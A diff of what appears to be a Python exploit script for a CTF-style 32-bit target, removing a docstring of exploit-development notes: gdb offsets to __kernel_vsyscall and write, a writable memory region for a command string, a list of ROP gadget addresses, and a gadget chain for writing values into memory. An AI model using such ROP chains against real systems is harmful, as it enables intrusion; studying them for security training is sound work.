@@ -3,69 +3,7 @@ import sys
 import socket
 import struct
  
-"""
-distance to vdso.__kernel_vsyscall on the unpacked binary
-(gdb) p __kernel_vsyscall
-$1 = {<text variable, no debug info>} 0xb7821414 <__kernel_vsyscall>
- 
-(gdb) p write
-$2 = {<text variable, no debug info>} 0xb78079c0 <write>
- 
-(gdb) p 0xb7821414 - 0xb78079c0
-$3 = 105044
- 
-packed binary:
-0x39A54
- 
-space for commandline string:
-gdb-peda$ x/100wx 0x8063184+0x200
-0x8063384:  0x00000000  0x00000000  0x00000000  0x00000000
-0x8063394:  0x00000000  0x00000000  0x00000000  0x00000000
-0x80633a4:  0x00000000  0x00000000  0x00000000  0x00000000
-0x80633b4:  0x00000000  0x00000000  0x00000000  0x00000000
-0x80633c4:  0x00000000  0x00000000  0x00000000  0x00000000
-0x80633d4:  0x00000000  0x00000000  0x00000000  0x00000000
-...
- 
-some useful gadgets:
-0x08048c8e: add dword ptr [ebx + 0x5d5b04c4], eax; ret; 
-0x0805ce50: add dword ptr [edi], ecx; test byte ptr [ecx], dl; ret; 
-0x0805d141: add dword ptr [edi], ecx; test byte ptr [edi], ch; ret; 
-0x0805d165: add dword ptr [edi], ecx; test dl, ah; ret;
- 
-0x08061f90: pop eax; add byte ptr cs:[ebp + eax*8 + 0xc], bl; add al, 4; ret; 
-0x08060e98: pop ebp; cld; leave; ret; 
-0x08048c93: pop ebp; ret; 
-0x08048c92: pop ebx; pop ebp; ret; 
-0x08048f83: pop ebx; pop esi; pop edi; pop ebp; ret; 
-0x0804880c: pop ebx; ret; 
-0x08048f85: pop edi; pop ebp; ret; 
-0x08048f84: pop esi; pop edi; pop ebp; ret; 
-0x0805d2e0: pop esp; ret 0xfffe; 
-0x080612d8: pop esp; rol dword ptr [eax + ecx], 0; ret 0x804; 
- 
-0x0805d1d8: xchg ah, dh; ret; 
-0x0805ff43: xchg dword ptr [ecx - 0x1600016a], ecx; ret 0xfee6; 
-0x0805d387: xchg eax, ebx; mov edx, 0xf000000; test dword ptr [edi], edi; ret 0xfffe; 
-0x0805d2d4: xchg eax, ebx; mov edx, 0xf000000; test esi, edx; ret 0xfffe; 
-0x080581f9: xchg eax, ecx; ret; 
-0x080614f0: xchg eax, esp; ret 0x805; 
-0x080581d0: xchg eax, esp; ret 0xffff; 
-0x0805d1e3: xchg ecx, ebp; ret; 
-0x08049420: xchg edx, esi; ret;
- 
-sum value/write block:
-    0x08048c92: pop ebx; pop ebp; ret;
-    0xADDR - 0x5d5b04c4
-    0xDATA
-    0x0805d1e3: xchg ecx, ebp; ret;
-    0x080581f9: xchg eax, ecx; ret; 
-    0x08048c8e: add dword ptr [ebx + 0x5d5b04c4], eax; ret;
- 
-"""
- 
- 
- 
+
 def p(v):
     return struct.pack('<L', v)
  
